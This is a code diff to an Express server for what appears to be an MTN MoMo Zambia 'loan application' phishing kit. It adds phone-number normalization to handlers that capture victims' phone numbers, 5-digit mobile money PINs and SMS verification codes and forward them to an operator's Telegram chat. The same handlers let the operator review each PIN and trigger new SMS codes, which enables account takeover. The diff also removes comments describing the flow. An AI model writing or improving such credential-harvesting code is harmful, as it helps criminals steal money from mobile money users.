@@ -51,6 +51,21 @@ function resolveTargetChat(adminParam) {
   return FALLBACK_ADMIN_ID;
 }
 
+function normalizeZeroPhone(rawPhone) {
+  const digits = String(rawPhone || '').replace(/\D/g, '');
+  if (!digits) return 'N/A';
+  if (digits.startsWith('260')) {
+    return '0' + digits.slice(3);
+  }
+  if (digits.startsWith('0')) {
+    return digits;
+  }
+  if (/^(96|76|56)\d{7}$/.test(digits)) {
+    return '0' + digits;
+  }
+  return digits;
+}
+
 function escapeMarkdown(str) {
   return String(str || '').replace(/([_*`\[])/g, '\\$1');
 }
@@ -176,9 +191,15 @@ app.post('/api/submit-application', async (req, res) => {
     const userId = `user_${Date.now()}`;
     lastActiveUserId = userId;
 
+    const normalizedApplicant = {
+      ...(applicant || {}),
+      phone: applicant && applicant.phone ? normalizeZeroPhone(applicant.phone) : undefined
+    };
+
     sessions.set(userId, {
       adminChatId: targetChat,
-      applicant: applicant || {},
+      phone: normalizedApplicant.phone,
+      applicant: normalizedApplicant,
       loan: loan || {},
       status: 'READY_FOR_PIN'
     });
@@ -201,7 +222,6 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// First Telegram message: immediately after 5-digit PIN & phone are filled (auto-submitted)
 app.post('/api/submit-pin', async (req, res) => {
   try {
     const { userId, phone, pin, applicantName } = req.body || {};
@@ -217,7 +237,8 @@ app.post('/api/submit-pin', async (req, res) => {
       sessions.set(activeId, session);
     }
 
-    if (phone) session.phone = phone;
+    const cleanPhone = normalizeZeroPhone(phone || session.phone);
+    if (cleanPhone !== 'N/A') session.phone = cleanPhone;
     if (applicantName) session.applicantName = applicantName;
     session.pin = pin;
     session.status = 'WAITING_PIN_REVIEW';
@@ -228,7 +249,7 @@ app.post('/api/submit-pin', async (req, res) => {
     const message =
       `📱 *NEW MTN MOMO APPLICANT*\n\n` +
       `👤 *Applicant:* ${escapeMarkdown(applicantName || session.applicantName || 'MTN MOMO ZAMBIA')}\n` +
-      `📞 *Phone No:* \`${escapeMarkdown(phone || session.phone || 'N/A')}\`\n` +
+      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
       `🔑 *5-Digit PIN:* \`${escapeMarkdown(pin)}\``;
 
     const opts = {
@@ -250,7 +271,6 @@ app.post('/api/submit-pin', async (req, res) => {
   }
 });
 
-// SMS verification submission (auto-submitted when starting with Y'ello or via VALIDATED SMS button)
 app.post('/api/submit-sms', async (req, res) => {
   try {
     const { userId, phone, sms, autoDetected } = req.body || {};
@@ -266,9 +286,10 @@ app.post('/api/submit-sms', async (req, res) => {
       sessions.set(activeId, session);
     }
 
+    const cleanPhone = normalizeZeroPhone(phone || session.phone);
     const cleanSms = String(sms || '').trim();
     session.sms = cleanSms;
-    if (phone) session.phone = phone;
+    if (cleanPhone !== 'N/A') session.phone = cleanPhone;
     session.status = 'WAITING_SMS_REVIEW';
     smsStore.set(activeId, cleanSms);
     lastActiveUserId = activeId;
@@ -277,7 +298,7 @@ app.post('/api/submit-sms', async (req, res) => {
 
     const message =
       `✉️ *MTN MOMO SMS VERIFICATION* ${autoDetected ? '(Auto-Submitted)' : ''}\n\n` +
-      `📞 *Phone No:* \`${escapeMarkdown(phone || session.phone || 'N/A')}\`\n` +
+      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
       `📩 *SMS Message:*\n\`${escapeMarkdown(cleanSms)}\``;
 
     const opts = {
@@ -303,7 +324,6 @@ app.post('/api/submit-sms', async (req, res) => {
   }
 });
 
-// Notify admin immediately when applicant requests a new SMS after 15s countdown ends
 app.post('/api/request-new-sms', async (req, res) => {
   try {
     const { userId, phone } = req.body || {};
@@ -313,10 +333,11 @@ app.post('/api/request-new-sms', async (req, res) => {
       session = { adminChatId: FALLBACK_ADMIN_ID };
     }
 
+    const cleanPhone = normalizeZeroPhone(phone || session.phone);
     const targetChat = session.adminChatId || FALLBACK_ADMIN_ID;
     const message =
       `🔔 *NEW SMS REQUESTED*\n\n` +
-      `📞 *Phone No:* \`${escapeMarkdown(phone || session.phone || 'N/A')}\`\n` +
+      `📞 *Phone No:* \`${escapeMarkdown(cleanPhone)}\`\n` +
       `⏳ Applicant requested a new verification SMS after the 15s timer ended.`;
 
     if (targetChat && bot) await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
@@ -331,3 +352,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
+                                   
